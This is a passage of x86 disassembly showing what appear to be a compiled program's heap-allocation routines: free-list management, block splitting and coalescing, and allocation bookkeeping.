  401cec:	74 0a                	je     0x401cf8
  401cee:	c7 05 b0 b5 40 00 05 	movl   $0x5,0x40b5b0
  401cf5:	00 00 00 
  401cf8:	f6 01 01             	testb  $0x1,(%ecx)
  401cfb:	74 29                	je     0x401d26
  401cfd:	8b d0                	mov    %eax,%edx
  401cff:	83 ea 0c             	sub    $0xc,%edx
  401d02:	8b 72 08             	mov    0x8(%edx),%esi
  401d05:	2b c6                	sub    %esi,%eax
  401d07:	89 04 24             	mov    %eax,(%esp)
  401d0a:	8b 04 24             	mov    (%esp),%eax
  401d0d:	3b 70 08             	cmp    0x8(%eax),%esi
  401d10:	74 0a                	je     0x401d1c
  401d12:	c7 05 b0 b5 40 00 06 	movl   $0x6,0x40b5b0
  401d19:	00 00 00 
  401d1c:	8b 04 24             	mov    (%esp),%eax
  401d1f:	e8 30 fe ff ff       	call   0x401b54
  401d24:	03 de                	add    %esi,%ebx
  401d26:	8b c3                	mov    %ebx,%eax
  401d28:	5a                   	pop    %edx
  401d29:	5e                   	pop    %esi
  401d2a:	5b                   	pop    %ebx
  401d2b:	c3                   	ret
  401d2c:	53                   	push   %ebx
  401d2d:	56                   	push   %esi
  401d2e:	51                   	push   %ecx
  401d2f:	8b d8                	mov    %eax,%ebx
  401d31:	33 f6                	xor    %esi,%esi
  401d33:	8b 03                	mov    (%ebx),%eax
  401d35:	a9 00 00 00 80       	test   $0x80000000,%eax
  401d3a:	74 0b                	je     0x401d47
  401d3c:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401d41:	03 f0                	add    %eax,%esi
  401d43:	03 d8                	add    %eax,%ebx
  401d45:	8b 03                	mov    (%ebx),%eax
  401d47:	a8 02                	test   $0x2,%al
  401d49:	75 18                	jne    0x401d63
  401d4b:	89 1c 24             	mov    %ebx,(%esp)
  401d4e:	8b 04 24             	mov    (%esp),%eax
  401d51:	e8 fe fd ff ff       	call   0x401b54
  401d56:	8b 04 24             	mov    (%esp),%eax
  401d59:	8b 40 08             	mov    0x8(%eax),%eax
  401d5c:	03 f0                	add    %eax,%esi
  401d5e:	03 d8                	add    %eax,%ebx
  401d60:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401d63:	8b c6                	mov    %esi,%eax
  401d65:	5a                   	pop    %edx
  401d66:	5e                   	pop    %esi
  401d67:	5b                   	pop    %ebx
  401d68:	c3                   	ret
  401d69:	8d 40 00             	lea    0x0(%eax),%eax
  401d6c:	53                   	push   %ebx
  401d6d:	56                   	push   %esi
  401d6e:	57                   	push   %edi
  401d6f:	55                   	push   %ebp
  401d70:	83 c4 f4             	add    $0xfffffff4,%esp
  401d73:	8b f2                	mov    %edx,%esi
  401d75:	8b e8                	mov    %eax,%ebp
  401d77:	33 db                	xor    %ebx,%ebx
  401d79:	8b c5                	mov    %ebp,%eax
  401d7b:	e8 68 fe ff ff       	call   0x401be8
  401d80:	89 44 24 08          	mov    %eax,0x8(%esp)
  401d84:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401d89:	0f 84 8f 00 00 00    	je     0x401e1e
  401d8f:	8b 44 24 08          	mov    0x8(%esp),%eax
  401d93:	8b 78 08             	mov    0x8(%eax),%edi
  401d96:	8b c7                	mov    %edi,%eax
  401d98:	8b 54 24 08          	mov    0x8(%esp),%edx
  401d9c:	03 42 0c             	add    0xc(%edx),%eax
  401d9f:	8b d0                	mov    %eax,%edx
  401da1:	8d 0c 2e             	lea    (%esi,%ebp,1),%ecx
  401da4:	2b d1                	sub    %ecx,%edx
  401da6:	83 fa 0c             	cmp    $0xc,%edx
  401da9:	7f 04                	jg     0x401daf
  401dab:	8b f0                	mov    %eax,%esi
  401dad:	2b f5                	sub    %ebp,%esi
  401daf:	8b c5                	mov    %ebp,%eax
  401db1:	2b c7                	sub    %edi,%eax
  401db3:	83 f8 0c             	cmp    $0xc,%eax
  401db6:	7d 16                	jge    0x401dce
  401db8:	8b 44 24 08          	mov    0x8(%esp),%eax
  401dbc:	8b d5                	mov    %ebp,%edx
  401dbe:	2b 50 08             	sub    0x8(%eax),%edx
  401dc1:	03 d6                	add    %esi,%edx
  401dc3:	8b cc                	mov    %esp,%ecx
  401dc5:	8b c7                	mov    %edi,%eax
  401dc7:	e8 1c fb ff ff       	call   0x4018e8
  401dcc:	eb 0f                	jmp    0x401ddd
  401dce:	8b cc                	mov    %esp,%ecx
  401dd0:	8b d6                	mov    %esi,%edx
  401dd2:	83 ea 04             	sub    $0x4,%edx
  401dd5:	8d 45 04             	lea    0x4(%ebp),%eax
  401dd8:	e8 0b fb ff ff       	call   0x4018e8
  401ddd:	8b 3c 24             	mov    (%esp),%edi
  401de0:	85 ff                	test   %edi,%edi
  401de2:	74 3a                	je     0x401e1e
  401de4:	8b d7                	mov    %edi,%edx
  401de6:	2b d5                	sub    %ebp,%edx
  401de8:	8b c5                	mov    %ebp,%eax
  401dea:	e8 3d fe ff ff       	call   0x401c2c
  401def:	8b 54 24 08          	mov    0x8(%esp),%edx
  401df3:	8b 52 08             	mov    0x8(%edx),%edx
  401df6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401dfa:	03 51 0c             	add    0xc(%ecx),%edx
  401dfd:	8b c7                	mov    %edi,%eax
  401dff:	03 44 24 04          	add    0x4(%esp),%eax
  401e03:	3b d0                	cmp    %eax,%edx
  401e05:	76 0a                	jbe    0x401e11
  401e07:	8d 14 2e             	lea    (%esi,%ebp,1),%edx
  401e0a:	2b d0                	sub    %eax,%edx
  401e0c:	e8 7b fe ff ff       	call   0x401c8c
  401e11:	8b d4                	mov    %esp,%edx
  401e13:	8b 44 24 08          	mov    0x8(%esp),%eax
  401e17:	e8 fc f4 ff ff       	call   0x401318
  401e1c:	b3 01                	mov    $0x1,%bl
  401e1e:	8b c3                	mov    %ebx,%eax
  401e20:	83 c4 0c             	add    $0xc,%esp
  401e23:	5d                   	pop    %ebp
  401e24:	5f                   	pop    %edi
  401e25:	5e                   	pop    %esi
  401e26:	5b                   	pop    %ebx
  401e27:	c3                   	ret
  401e28:	53                   	push   %ebx
  401e29:	56                   	push   %esi
  401e2a:	83 c4 f4             	add    $0xfffffff4,%esp
  401e2d:	8b da                	mov    %edx,%ebx
  401e2f:	8b f0                	mov    %eax,%esi
  401e31:	89 34 24             	mov    %esi,(%esp)
  401e34:	8b 04 24             	mov    (%esp),%eax
  401e37:	89 58 08             	mov    %ebx,0x8(%eax)
  401e3a:	8b 04 24             	mov    (%esp),%eax
  401e3d:	03 c3                	add    %ebx,%eax
  401e3f:	83 e8 0c             	sub    $0xc,%eax
  401e42:	89 58 08             	mov    %ebx,0x8(%eax)
  401e45:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  401e4b:	7f 76                	jg     0x401ec3
  401e4d:	8b c3                	mov    %ebx,%eax
  401e4f:	85 c0                	test   %eax,%eax
  401e51:	79 03                	jns    0x401e56
  401e53:	83 c0 03             	add    $0x3,%eax
  401e56:	c1 f8 02             	sar    $0x2,%eax
  401e59:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  401e5f:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401e63:	89 54 24 04          	mov    %edx,0x4(%esp)
  401e67:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401e6c:	75 23                	jne    0x401e91
  401e6e:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  401e74:	8b 0c 24             	mov    (%esp),%ecx
  401e77:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  401e7b:	8b 04 24             	mov    (%esp),%eax
  401e7e:	8b 14 24             	mov    (%esp),%edx
  401e81:	89 50 04             	mov    %edx,0x4(%eax)
  401e84:	8b 04 24             	mov    (%esp),%eax
  401e87:	8b 14 24             	mov    (%esp),%edx
  401e8a:	89 10                	mov    %edx,(%eax)
  401e8c:	e9 88 00 00 00       	jmp    0x401f19
  401e91:	8b 44 24 04          	mov    0x4(%esp),%eax
  401e95:	8b 00                	mov    (%eax),%eax
  401e97:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e9b:	8b 04 24             	mov    (%esp),%eax
  401e9e:	8b 54 24 04          	mov    0x4(%esp),%edx
  401ea2:	89 50 04             	mov    %edx,0x4(%eax)
  401ea5:	8b 04 24             	mov    (%esp),%eax
  401ea8:	8b 54 24 08          	mov    0x8(%esp),%edx
  401eac:	89 10                	mov    %edx,(%eax)
  401eae:	8b 44 24 04          	mov    0x4(%esp),%eax
  401eb2:	8b 14 24             	mov    (%esp),%edx
  401eb5:	89 10                	mov    %edx,(%eax)
  401eb7:	8b 44 24 08          	mov    0x8(%esp),%eax
  401ebb:	8b 14 24             	mov    (%esp),%edx
  401ebe:	89 50 04             	mov    %edx,0x4(%eax)
  401ec1:	eb 56                	jmp    0x401f19
  401ec3:	81 fb 00 3c 00 00    	cmp    $0x3c00,%ebx
  401ec9:	7c 0d                	jl     0x401ed8
  401ecb:	8b d3                	mov    %ebx,%edx
  401ecd:	8b c6                	mov    %esi,%eax
  401ecf:	e8 98 fe ff ff       	call   0x401d6c
  401ed4:	84 c0                	test   %al,%al
  401ed6:	75 41                	jne    0x401f19
  401ed8:	a1 00 b6 40 00       	mov    0x40b600,%eax
  401edd:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ee1:	8b 04 24             	mov    (%esp),%eax
  401ee4:	a3 00 b6 40 00       	mov    %eax,0x40b600
  401ee9:	8b 44 24 04          	mov    0x4(%esp),%eax
  401eed:	8b 00                	mov    (%eax),%eax
  401eef:	89 44 24 08          	mov    %eax,0x8(%esp)
  401ef3:	8b 04 24             	mov    (%esp),%eax
  401ef6:	8b 54 24 04          	mov    0x4(%esp),%edx
  401efa:	89 50 04             	mov    %edx,0x4(%eax)
  401efd:	8b 04 24             	mov    (%esp),%eax
  401f00:	8b 54 24 08          	mov    0x8(%esp),%edx
  401f04:	89 10                	mov    %edx,(%eax)
  401f06:	8b 44 24 04          	mov    0x4(%esp),%eax
  401f0a:	8b 14 24             	mov    (%esp),%edx
  401f0d:	89 10                	mov    %edx,(%eax)
  401f0f:	8b 44 24 08          	mov    0x8(%esp),%eax
  401f13:	8b 14 24             	mov    (%esp),%edx
  401f16:	89 50 04             	mov    %edx,0x4(%eax)
  401f19:	83 c4 0c             	add    $0xc,%esp
  401f1c:	5e                   	pop    %esi
  401f1d:	5b                   	pop    %ebx
  401f1e:	c3                   	ret
  401f1f:	90                   	nop
  401f20:	83 3d 04 b6 40 00 00 	cmpl   $0x0,0x40b604
  401f27:	7e 40                	jle    0x401f69
  401f29:	83 3d 04 b6 40 00 0c 	cmpl   $0xc,0x40b604
  401f30:	7d 0c                	jge    0x401f3e
  401f32:	c7 05 b0 b5 40 00 07 	movl   $0x7,0x40b5b0
  401f39:	00 00 00 
  401f3c:	eb 2b                	jmp    0x401f69
  401f3e:	a1 04 b6 40 00       	mov    0x40b604,%eax
  401f43:	83 c8 02             	or     $0x2,%eax
  401f46:	8b 15 08 b6 40 00    	mov    0x40b608,%edx
  401f4c:	89 02                	mov    %eax,(%edx)
  401f4e:	a1 08 b6 40 00       	mov    0x40b608,%eax
  401f53:	83 c0 04             	add    $0x4,%eax
  401f56:	e8 0d fd ff ff       	call   0x401c68
  401f5b:	33 c0                	xor    %eax,%eax
  401f5d:	a3 08 b6 40 00       	mov    %eax,0x40b608
  401f62:	33 c0                	xor    %eax,%eax
  401f64:	a3 04 b6 40 00       	mov    %eax,0x40b604
  401f69:	c3                   	ret
  401f6a:	8b c0                	mov    %eax,%eax
  401f6c:	53                   	push   %ebx
  401f6d:	56                   	push   %esi
  401f6e:	57                   	push   %edi
  401f6f:	83 c4 f0             	add    $0xfffffff0,%esp
  401f72:	8b f0                	mov    %eax,%esi
  401f74:	8d 3c 24             	lea    (%esp),%edi
  401f77:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401f78:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401f79:	8b fc                	mov    %esp,%edi
  401f7b:	e8 a0 ff ff ff       	call   0x401f20
  401f80:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401f84:	8b d7                	mov    %edi,%edx
  401f86:	b8 10 b6 40 00       	mov    $0x40b610,%eax
  401f8b:	e8 00 f3 ff ff       	call   0x401290
  401f90:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401f94:	85 db                	test   %ebx,%ebx
  401f96:	75 04                	jne    0x401f9c
  401f98:	33 c0                	xor    %eax,%eax
  401f9a:	eb 52                	jmp    0x401fee
  401f9c:	8b 07                	mov    (%edi),%eax
  401f9e:	3b d8                	cmp    %eax,%ebx
  401fa0:	73 0a                	jae    0x401fac
  401fa2:	e8 0d fd ff ff       	call   0x401cb4
  401fa7:	29 07                	sub    %eax,(%edi)
  401fa9:	01 47 04             	add    %eax,0x4(%edi)
  401fac:	8b 07                	mov    (%edi),%eax
  401fae:	03 47 04             	add    0x4(%edi),%eax
  401fb1:	8b f3                	mov    %ebx,%esi
  401fb3:	03 74 24 0c          	add    0xc(%esp),%esi
  401fb7:	3b c6                	cmp    %esi,%eax
  401fb9:	73 08                	jae    0x401fc3
  401fbb:	e8 6c fd ff ff       	call   0x401d2c
  401fc0:	01 47 04             	add    %eax,0x4(%edi)
  401fc3:	8b 07                	mov    (%edi),%eax
  401fc5:	03 47 04             	add    0x4(%edi),%eax
  401fc8:	3b f0                	cmp    %eax,%esi
  401fca:	75 11                	jne    0x401fdd
  401fcc:	83 e8 04             	sub    $0x4,%eax
  401fcf:	ba 04 00 00 00       	mov    $0x4,%edx
  401fd4:	e8 53 fc ff ff       	call   0x401c2c
  401fd9:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401fdd:	8b 07                	mov    (%edi),%eax
  401fdf:	a3 08 b6 40 00       	mov    %eax,0x40b608
  401fe4:	8b 47 04             	mov    0x4(%edi),%eax
  401fe7:	a3 04 b6 40 00       	mov    %eax,0x40b604
  401fec:	b0 01                	mov    $0x1,%al
  401fee:	83 c4 10             	add    $0x10,%esp
  401ff1:	5f                   	pop    %edi
  401ff2:	5e                   	pop    %esi
  401ff3:	5b                   	pop    %ebx
  401ff4:	c3                   	ret
  401ff5:	8d 40 00             	lea    0x0(%eax),%eax
  401ff8:	53                   	push   %ebx
  401ff9:	83 c4 f8             	add    $0xfffffff8,%esp
  401ffc:	8b d8                	mov    %eax,%ebx
  401ffe:	8b d4                	mov    %esp,%edx
  402000:	8d 43 04             	lea    0x4(%ebx),%eax
  402003:	e8 f4 f6 ff ff       	call   0x4016fc
  402008:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40200c:	74 0b                	je     0x402019
  40200e:	8b c4                	mov    %esp,%eax
  402010:	e8 57 ff ff ff       	call   0x401f6c
  402015:	84 c0                	test   %al,%al
  402017:	75 04                	jne    0x40201d
  402019:	33 c0                	xor    %eax,%eax
  40201b:	eb 02                	jmp    0x40201f
  40201d:	b0 01                	mov    $0x1,%al
  40201f:	59                   	pop    %ecx
  402020:	5a                   	pop    %edx
  402021:	5b                   	pop    %ebx
  402022:	c3                   	ret
  402023:	90                   	nop
  402024:	53                   	push   %ebx
  402025:	56                   	push   %esi
  402026:	83 c4 f8             	add    $0xfffffff8,%esp
  402029:	8b f2                	mov    %edx,%esi
  40202b:	8b d8                	mov    %eax,%ebx
  40202d:	8b cc                	mov    %esp,%ecx
  40202f:	8d 56 04             	lea    0x4(%esi),%edx
  402032:	8b c3                	mov    %ebx,%eax
  402034:	e8 6b f7 ff ff       	call   0x4017a4
  402039:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40203d:	74 0b                	je     0x40204a
  40203f:	8b c4                	mov    %esp,%eax
  402041:	e8 26 ff ff ff       	call   0x401f6c
  402046:	84 c0                	test   %al,%al
  402048:	75 04                	jne    0x40204e
  40204a:	33 c0                	xor    %eax,%eax
  40204c:	eb 02                	jmp    0x402050
  40204e:	b0 01                	mov    $0x1,%al
  402050:	59                   	pop    %ecx
  402051:	5a                   	pop    %edx
  402052:	5e                   	pop    %esi
  402053:	5b                   	pop    %ebx
  402054:	c3                   	ret
  402055:	8d 40 00             	lea    0x0(%eax),%eax
  402058:	51                   	push   %ecx
  402059:	8b d4                	mov    %esp,%edx
  40205b:	33 c9                	xor    %ecx,%ecx
  40205d:	89 0a                	mov    %ecx,(%edx)
  40205f:	85 c0                	test   %eax,%eax
  402061:	79 03                	jns    0x402066
  402063:	83 c0 03             	add    $0x3,%eax
  402066:	c1 f8 02             	sar    $0x2,%eax
  402069:	3d 00 04 00 00       	cmp    $0x400,%eax
  40206e:	7f 19                	jg     0x402089
  402070:	8b 0d 0c b6 40 00    	mov    0x40b60c,%ecx
  402076:	8b 4c 81 f4          	mov    -0xc(%ecx,%eax,4),%ecx
  40207a:	89 0a                	mov    %ecx,(%edx)
  40207c:	83 3a 00             	cmpl   $0x0,(%edx)
  40207f:	75 08                	jne    0x402089
  402081:	40                   	inc    %eax
  402082:	3d 01 04 00 00       	cmp    $0x401,%eax
  402087:	75 e7                	jne    0x402070
  402089:	8b 02                	mov    (%edx),%eax
  40208b:	5a                   	pop    %edx
  40208c:	c3                   	ret
  40208d:	8d 40 00             	lea    0x0(%eax),%eax
  402090:	53                   	push   %ebx
  402091:	56                   	push   %esi
  402092:	57                   	push   %edi
  402093:	55                   	push   %ebp
  402094:	83 c4 f4             	add    $0xfffffff4,%esp
  402097:	8b d8                	mov    %eax,%ebx
  402099:	8d 74 24 08          	lea    0x8(%esp),%esi
  40209d:	bf 00 b6 40 00       	mov    $0x40b600,%edi
  4020a2:	bd 04 b6 40 00       	mov    $0x40b604,%ebp
  4020a7:	a1 f8 b5 40 00       	mov    0x40b5f8,%eax
  4020ac:	89 06                	mov    %eax,(%esi)
  4020ae:	8b 06                	mov    (%esi),%eax
  4020b0:	3b 58 08             	cmp    0x8(%eax),%ebx
  4020b3:	0f 8e ab 00 00 00    	jle    0x402164
  4020b9:	8b 07                	mov    (%edi),%eax
  4020bb:	89 06                	mov    %eax,(%esi)
  4020bd:	8b 06                	mov    (%esi),%eax
  4020bf:	8b 40 08             	mov    0x8(%eax),%eax
  4020c2:	3b d8                	cmp    %eax,%ebx
  4020c4:	0f 8e 9a 00 00 00    	jle    0x402164
  4020ca:	8b 16                	mov    (%esi),%edx
  4020cc:	89 5a 08             	mov    %ebx,0x8(%edx)
  4020cf:	8b 16                	mov    (%esi),%edx
  4020d1:	8b 52 04             	mov    0x4(%edx),%edx
  4020d4:	89 16                	mov    %edx,(%esi)
  4020d6:	8b 16                	mov    (%esi),%edx
  4020d8:	3b 5a 08             	cmp    0x8(%edx),%ebx
  4020db:	7f f2                	jg     0x4020cf
  4020dd:	8b 17                	mov    (%edi),%edx
  4020df:	89 42 08             	mov    %eax,0x8(%edx)
  4020e2:	8b 06                	mov    (%esi),%eax
  4020e4:	3b 07                	cmp    (%edi),%eax
  4020e6:	74 06                	je     0x4020ee
  4020e8:	8b 06                	mov    (%esi),%eax
  4020ea:	89 07                	mov    %eax,(%edi)
  4020ec:	eb 76                	jmp    0x402164
  4020ee:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4020f4:	7f 0e                	jg     0x402104
  4020f6:	8b c3                	mov    %ebx,%eax
  4020f8:	e8 5b ff ff ff       	call   0x402058
  4020fd:	89 06                	mov    %eax,(%esi)
  4020ff:	83 3e 00             	cmpl   $0x0,(%esi)
  402102:	75 60                	jne    0x402164
  402104:	8b c3                	mov    %ebx,%eax
  402106:	e8 ed fe ff ff       	call   0x401ff8
  40210b:	84 c0                	test   %al,%al
  40210d:	75 0a                	jne    0x402119
  40210f:	33 c0                	xor    %eax,%eax
  402111:	89 04 24             	mov    %eax,(%esp)
  402114:	e9 b4 00 00 00       	jmp    0x4021cd
  402119:	3b 5d 00             	cmp    0x0(%ebp),%ebx
  40211c:	7f 89                	jg     0x4020a7
  40211e:	29 5d 00             	sub    %ebx,0x0(%ebp)
  402121:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  402125:	7d 08                	jge    0x40212f
  402127:	03 5d 00             	add    0x0(%ebp),%ebx
  40212a:	33 c0                	xor    %eax,%eax
  40212c:	89 45 00             	mov    %eax,0x0(%ebp)
  40212f:	a1 08 b6 40 00       	mov    0x40b608,%eax
  402134:	89 44 24 04          	mov    %eax,0x4(%esp)
  402138:	01 1d 08 b6 40 00    	add    %ebx,0x40b608
  40213e:	8b c3                	mov    %ebx,%eax
  402140:	83 c8 02             	or     $0x2,%eax
  402143:	8b 54 24 04          	mov    0x4(%esp),%edx
  402147:	89 02                	mov    %eax,(%edx)
  402149:	8b 44 24 04          	mov    0x4(%esp),%eax
  40214d:	83 c0 04             	add    $0x4,%eax
  402150:	89 04 24             	mov    %eax,(%esp)
  402153:	ff 05 9c b5 40 00    	incl   0x40b59c
  402159:	83 eb 04             	sub    $0x4,%ebx
  40215c:	01 1d a0 b5 40 00    	add    %ebx,0x40b5a0
  402162:	eb 69                	jmp    0x4021cd
  402164:	8b 06                	mov    (%esi),%eax
  402166:	e8 e9 f9 ff ff       	call   0x401b54
  40216b:	8b 06                	mov    (%esi),%eax
  40216d:	8b 50 08             	mov    0x8(%eax),%edx
  402170:	8b c2                	mov    %edx,%eax
  402172:	2b c3                	sub    %ebx,%eax
  402174:	83 f8 0c             	cmp    $0xc,%eax
  402177:	7c 0c                	jl     0x402185
  402179:	8b 16                	mov    (%esi),%edx
  40217b:	03 d3                	add    %ebx,%edx
  40217d:	92                   	xchg   %eax,%edx
  40217e:	e8 a5 fc ff ff       	call   0x401e28
  402183:	eb 1e                	jmp    0x4021a3
  402185:	8b da                	mov    %edx,%ebx
  402187:	8b 06                	mov    (%esi),%eax
  402189:	3b 07                	cmp    (%edi),%eax
  40218b:	75 07                	jne    0x402194
  40218d:	8b 06                	mov    (%esi),%eax
  40218f:	8b 40 04             	mov    0x4(%eax),%eax
  402192:	89 07                	mov    %eax,(%edi)
  402194:	8b 06                	mov    (%esi),%eax
  402196:	03 c3                	add    %ebx,%eax
  402198:	89 44 24 04          	mov    %eax,0x4(%esp)
  40219c:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021a0:	83 20 fe             	andl   $0xfffffffe,(%eax)
  4021a3:	8b 06                	mov    (%esi),%eax
  4021a5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4021a9:	8b c3                	mov    %ebx,%eax
  4021ab:	83 c8 02             	or     $0x2,%eax
  4021ae:	8b 54 24 04          	mov    0x4(%esp),%edx
  4021b2:	89 02                	mov    %eax,(%edx)
  4021b4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021b8:	83 c0 04             	add    $0x4,%eax
  4021bb:	89 04 24             	mov    %eax,(%esp)
  4021be:	ff 05 9c b5 40 00    	incl   0x40b59c
  4021c4:	83 eb 04             	sub    $0x4,%ebx
  4021c7:	01 1d a0 b5 40 00    	add    %ebx,0x40b5a0
  4021cd:	8b 04 24             	mov    (%esp),%eax
  4021d0:	83 c4 0c             	add    $0xc,%esp
  4021d3:	5d                   	pop    %ebp
  4021d4:	5f                   	pop    %edi
  4021d5:	5e                   	pop    %esi
  4021d6:	5b                   	pop    %ebx
  4021d7:	c3                   	ret
  4021d8:	55                   	push   %ebp
  4021d9:	8b ec                	mov    %esp,%ebp
  4021db:	83 c4 ec             	add    $0xffffffec,%esp
  4021de:	53                   	push   %ebx
  4021df:	8b d8                	mov    %eax,%ebx
  4021e1:	80 3d ac b5 40 00 00 	cmpb   $0x0,0x40b5ac
  4021e8:	75 09                	jne    0x4021f3
  4021ea:	e8 8d f7 ff ff       	call   0x40197c
  4021ef:	84 c0                	test   %al,%al
  4021f1:	74 08                	je     0x4021fb
  4021f3:	81 fb f8 ff ff 7f    	cmp    $0x7ffffff8,%ebx
  4021f9:	7e 0a                	jle    0x402205
  4021fb:	33 c0                	xor    %eax,%eax
  4021fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402200:	e9 76 01 00 00       	jmp    0x40237b
  402205:	33 d2                	xor    %edx,%edx
  402207:	55                   	push   %ebp
  402208:	68 74 23 40 00       	push   $0x402374
  40220d:	64 ff 32             	push   %fs:(%edx)
  402210:	64 89 22             	mov    %esp,%fs:(%edx)
  402213:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  40221a:	74 0a                	je     0x402226
  40221c:	68 b4 b5 40 00       	push   $0x40b5b4
  402221:	e8 36 ef ff ff       	call   0x40115c
  402226:	83 c3 07             	add    $0x7,%ebx
  402229:	83 e3 fc             	and    $0xfffffffc,%ebx
  40222c:	83 fb 0c             	cmp    $0xc,%ebx
  40222f:	7d 05                	jge    0x402236
  402231:	bb 0c 00 00 00       	mov    $0xc,%ebx
  402236:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  40223c:	0f 8f ac 00 00 00    	jg     0x4022ee
  402242:	8b c3                	mov    %ebx,%eax
  402244:	85 c0                	test   %eax,%eax
  402246:	79 03                	jns    0x40224b
  402248:	83 c0 03             	add    $0x3,%eax
  40224b:	c1 f8 02             	sar    $0x2,%eax
  40224e:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  402254:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  402258:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40225b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40225f:	0f 84 89 00 00 00    	je     0x4022ee
  402265:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402268:	03 d3                	add    %ebx,%edx
  40226a:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40226d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402270:	83 22 fe             	andl   $0xfffffffe,(%edx)
  402273:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402276:	8b 52 04             	mov    0x4(%edx),%edx
  402279:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40227c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40227f:	3b 55 f8             	cmp    -0x8(%ebp),%edx
  402282:	75 0e                	jne    0x402292
  402284:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  40228a:	33 c9                	xor    %ecx,%ecx
  40228c:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  402290:	eb 26                	jmp    0x4022b8
  402292:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  402298:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40229b:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  40229f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022a2:	8b 00                	mov    (%eax),%eax
  4022a4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4022a7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022aa:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4022ad:	89 50 04             	mov    %edx,0x4(%eax)
  4022b0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4022b3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4022b6:	89 10                	mov    %edx,(%eax)
  4022b8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022bb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4022be:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022c1:	8b 40 08             	mov    0x8(%eax),%eax
  4022c4:	83 c8 02             	or     $0x2,%eax
  4022c7:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4022ca:	89 02                	mov    %eax,(%edx)
  4022cc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4022cf:	83 c0 04             	add    $0x4,%eax
  4022d2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022d5:	ff 05 9c b5 40 00    	incl   0x40b59c
  4022db:	83 eb 04             	sub    $0x4,%ebx
  4022de:	01 1d a0 b5 40 00    	add    %ebx,0x40b5a0
  4022e4:	e8 97 0f 00 00       	call   0x403280
  4022e9:	e9 8d 00 00 00       	jmp    0x40237b
  4022ee:	3b 1d 04 b6 40 00    	cmp    0x40b604,%ebx
  4022f4:	7f 53                	jg     0x402349
  4022f6:	29 1d 04 b6 40 00    	sub    %ebx,0x40b604
  4022fc:	83 3d 04 b6 40 00 0c 	cmpl   $0xc,0x40b604
  402303:	7d 0d                	jge    0x402312
  402305:	03 1d 04 b6 40 00    	add    0x40b604,%ebx
  40230b:	33 c0                	xor    %eax,%eax
  40230d:	a3 04 b6 40 00       	mov    %eax,0x40b604
  402312:	a1 08 b6 40 00       	mov    0x40b608,%eax
  402317:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40231a:	01 1d 08 b6 40 00    	add    %ebx,0x40b608
  402320:	8b c3                	mov    %ebx,%eax
  402322:	83 c8 02             	or     $0x2,%eax
  402325:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402328:	89 02                	mov    %eax,(%edx)
  40232a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40232d:	83 c0 04             	add    $0x4,%eax
  402330:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402333:	ff 05 9c b5 40 00    	incl   0x40b59c
  402339:	83 eb 04             	sub    $0x4,%ebx
  40233c:	01 1d a0 b5 40 00    	add    %ebx,0x40b5a0
  402342:	e8 39 0f 00 00       	call   0x403280
  402347:	eb 32                	jmp    0x40237b
  402349:	8b c3                	mov    %ebx,%eax
  40234b:	e8 40 fd ff ff       	call   0x402090
  402350:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402353:	33 c0                	xor    %eax,%eax
  402355:	5a                   	pop    %edx
  402356:	59                   	pop    %ecx
  402357:	59                   	pop    %ecx
  402358:	64 89 10             	mov    %edx,%fs:(%eax)
  40235b:	68 7b 23 40 00       	push   $0x40237b
  402360:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  402367:	74 0a                	je     0x402373
